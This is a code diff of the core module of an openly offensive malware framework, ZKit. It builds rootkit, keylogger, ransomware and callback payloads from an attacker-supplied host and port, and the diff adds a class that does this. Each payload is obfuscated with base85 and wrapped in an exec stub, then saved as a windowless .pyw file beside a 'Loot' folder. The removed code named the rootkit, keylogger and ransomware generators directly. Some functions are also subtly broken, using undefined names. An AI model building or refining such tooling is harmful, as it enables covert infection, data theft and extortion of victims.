@@ -1,4 +1,5 @@
 """
+
 The Core Module of ZKit-Framework Contains : some useful methods like a custom create_file
 
 """
@@ -7,17 +8,22 @@ from __future__ import print_function, division, absolute_import
 import os
 import random
 from base64 import b85encode as be
+import socket as s
+from core.lib.payload import PayloadGenerator
+path = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
+
+DECODE_STUB = 'from base64 import b85decode\nvalue ="""{}"""''\nexec(b85decode(value))'
+
 
 def init():
-    'init the zkit . without you will get several errors'
-    path_ = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
-    rootkit_path = path_ + "\\Builded\\Rootkit\\"
-    keylogger_path = path_ + "\\Builded\\KeyLogger\\"
-    ransomware_path = path_ + "\\Builded\\Ransomware\\"
-    os.popen("mkdir {}".format(rootkit_path)).close()
-    os.popen("mkdir {}".format(keylogger_path)).close()
-    os.popen("mkdir {}".format(ransomware_path)).close()
-    os.popen("mkdir {}".format(path_ + '\\Loot')).close()
+    'inits the zkit . without you will get several errors'
+    pathslist = [path + "\\Builded\\", path + '\\Loot\\',
+                 path + "\\User\\Payloads\\"
+
+                 ]
+    for _path in pathslist:
+        os.popen("mkdir {}".format(_path)).close()
+    os.popen('echo > {}'.format(path + "\\Errors.log"))
     if os.name == "nt":
         os.system("cls")
     else:
@@ -26,6 +32,7 @@ def init():
 
 class Color:
     'ANSI Color codes'
+
     def __init__(self):
         self.colors = {
             "black": "\033[30m",
@@ -39,13 +46,67 @@ class Color:
             "reset": "\033[0m",
         }
 
-    def GetColor(self, colorname): # pylint: disable=C0103; # noqa
+    def GetColor(self, colorname):  # pylint: disable=C0103; # noqa
         'Gets a color from colors dict case insensetive'
         return self.colors.get(colorname.lower())
 
-    def GetAllColors(self): # pylint: disable=C0103; # noqa
+    def GetAllColors(self):  # pylint: disable=C0103; # noqa
         "returns all colors and reset as a tuple"
         return tuple(self.colors.values())
+
+    def RandomColor(self):
+        colors = [*self.GetAllColors()]
+        gc = self.GetColor
+        to_remove = ['grey', 'reset', 'black']
+        for r in to_remove:
+            colors.remove(gc(r))
+        return random.choice([colors])
+
+
+def search_for_payloads(where="\\User\\Payloads\\") -> dict:
+    "searches \\User\\Payloads\\ for payloads to install or the place you say"
+    payloads = {}
+    for r, d, _ in os.walk(path + where):
+        for payload in d:
+
+            payloads[payload] = r + payload
+
+    return payloads
+
+
+def list_payloads(payloads=search_for_payloads()):
+    "You can get the result form search_user_payloads or i will do it"
+    col = Color()
+    for index, payload in enumerate(payloads.keys()):
+        print(random.choice(col.RandomColor()) + "{%s} --> %s" % (str(index + 1), payload + ((15 - len(payload))
+                                                                                             * " ") + " >>> " + payloads[payload].replace(path, '')) + col.GetColor('reset'))
+        print("")
+    print("{000} --> Back To Main Menu")
+
+    return payloads
+
+
+def list_builtin_payloads(payload_type):
+    path = "\\core\\lib\\payloads\\" + payload_type + "\\"
+    payloads = search_for_payloads(path)
+    payloads = list_payloads(payloads)
+    print("Please Choose One Of Them (Number Of It): ", end="")
+    return payloads
+
+
+def crash_handler(exception: BaseException):
+    with open(os.path.dirname(__file__) + "\\Errors.log", "a") as f:
+        f.write("[{}] : {}\n".format(dt.now(), e))
+    print("Sth went really wrong that we couldnt handle it\n"
+          + "the exceptions value have saved to Errors.log\n"
+          + "please report this on github to me."
+          + "Do you want zkit to reraise it ? (reraising may help better) (Y/N): ", end='')
+    choice = str(input()).lower()
+    if choice.strip() == "y":
+        print("This is going to print full error . please report it on github")
+        raise
+    else:
+        print("Ignoring")
 
 
 def notify(status: str, message: str, ending="\n", flush=False):
@@ -67,7 +128,7 @@ def notify(status: str, message: str, ending="\n", flush=False):
                  'notify': 'green|[ NOTIFY ]',
                  'problem': 'red|[CRITICAL]',
                  'question': 'yellow|[QUESTION]',
-                }
+                 }
     for stat in all_stats:
         if stat == status:
             temp = all_stats[stat].split('|')
@@ -77,7 +138,7 @@ def notify(status: str, message: str, ending="\n", flush=False):
         '\r' if flush else '', first, message), end=ending)
 
 
-def ask_for(message: str, report: str, default=None, type=str, args=None): # pylint: disable=W0622; # noqa
+def ask_for(message: str, report: str, default=None, type=str, args=None):  # pylint: disable=W0622; # noqa
     """
     Asks for anything from users . (uses notify)
 
@@ -138,13 +199,14 @@ def create_file(file: str):
         if choice == "Y":
             pass
         elif choice == "N":
-            file = str(input("Write Down File Name Here : ")) + ".pyw"
+            file = os.path.dirname(
+                file) + "\\" + str(input("Write Down new file name here : ")) + ".pyw"
         else:
             notify("problem", "\nInvalid Input Try Again")
             while True:
                 notify("File Already Exists Confirm Overwrite : (N or Y) ", "")
                 choice = str(input("")).upper()
-                if choice == "Y": # pylint: disable=R1723; # noqa
+                if choice == "Y":  # pylint: disable=R1723; # noqa
                     break
                 elif choice == "N":
                     file = str(
@@ -158,52 +220,74 @@ def create_file(file: str):
     return file
 
 
-def generate(payload_type):
-    "generates payloads with given payload_type"
-    from core.helper_core.rootkit import get_rootkit
-    from core.helper_core.keylogger import get_keylogger
-    from core.helper_core.ransomware import get_ransomware
-    if payload_type == "rootkit":
-        payload, path = get_rootkit()
-    elif payload_type == "keylogger":
-        payload, path = get_keylogger()
-    elif payload_type == "ransomware":
-        payload, path = get_ransomware()
-
+def open_file(path: str):
     notify("notify", "Opening File To Write Data On It...", "")
     try:
         file = open(path, "w+")
-    except Exception: # pylint: disable=W0703; # noqa
+    except Exception:  # pylint: disable=W0703; # noqa
         notify(
             "problem", "Opening File To Write Data On It...Failed \n Cannnot Open File", "\n", True)
+        return
+    except PermissionError:
+        notify(
+            "problem", "Opening File To Write Data On It...Failed \n Permission Denied", "\n", True)
         return
     else:
         notify("report",
                "Opening File To Write Data On It...Done", "\n", True)
+    return file
+
+
+def write_file(file, data: str):
+    if file.writable():
+        file.write(data)
+
+    else:
+        notify('problem', "The file is not writable please try again . "
+               "if the problem presists please report it")
+    file.close()
+
+
+class Generate:
+    def __init__(self, root: str):
+        "generates payloads with given root, "
+        self.root = root
+        self.get_info()
+        self.get_payload()
+        self.payload = encrypt_it(self.payload)
+        self.path = create_file(path + "\\Builded\\" + self.path + ".pyw")
+        f = open_file(self.path)
+        write_file(f, self.payload)
+        notify('report', "Operaion Was Successful")
+
+    def get_info(self):
+        self.host = ask_for("Whats you ip address, hostname" +
+                            "left it to empty to use your own hostname (automic) : ",
+                            "Using ip \\| as Host", default=['', s.gethostbyname],
+                            args=s.gethostname()
+                            )
+        self.port = ask_for("Whats An Open Port In Your Machine " +
+                            "Left It '-1' To Use Default Port (1534 Eclipse's "
+                            "default communicate port) : ", "Using \\| As Port",
+                            default=[-1, 1534], type=int,
+                            )
+        self.path = ask_for("Whats the filename  " +
+                            "for your zkit generated script : ",
+                            "using \\|.pyw as your filename",
+                            default=['', ''], type=str,
+                            )
+
+    def get_payload(self) -> str:
+        self.payload = PayloadGenerator(
+            self.root).generate(self.host, self.port)
+
+
+def encrypt_it(payload) -> str:
     notify("notify", "Encrypting Data Before Writing On File...", "")
     payload = be(payload.encode("UTF-8")).decode("UTF-8")
     notify("report",
            "Encrypting Data Before Writing On File...Done", "\n", True)
-    payload = 'from base64 import b85decode\nvalue = """' + \
-        payload + '"""\nexec(b85decode(value))'
-    notify("notify", "Writing Data On File...", "")
-    try:
-        file.write(payload)
-    except PermissionError:
-        notify("problem", "Writing Data On File...Failed \nSomething Went Wrong . Looks Like "
-               "You Dont Have Access To The File." "\n", True)
-    except Exception: # pylint: disable=W0703; # noqa
-        notify("problem", "Writing Data On File...Failed \nSomething Went Wrong . " +
-               "Is Another Process "
-               "Using It ? ", "\n", True)
-        notify("problem", "Couldnt Write Data On File Closing File...", "")
-        file.close()
-        print("Done")
-    else:
-        notify("report",
-               "Writing Data On File...Done", "\n", True)
-        notify("report",
-               "Operation was successful")
+    return DECODE_STUB.format(payload)
 
 
 def print_banner():
@@ -215,7 +299,3 @@ def print_banner():
     banner = random.choice([banner1, banner2])
     color = random.choice([red, green, blue, magenta, cyan])
     print(color + banner + reset)
-
-
-if __name__ == "__main__":
-    print("Dont Run This File")
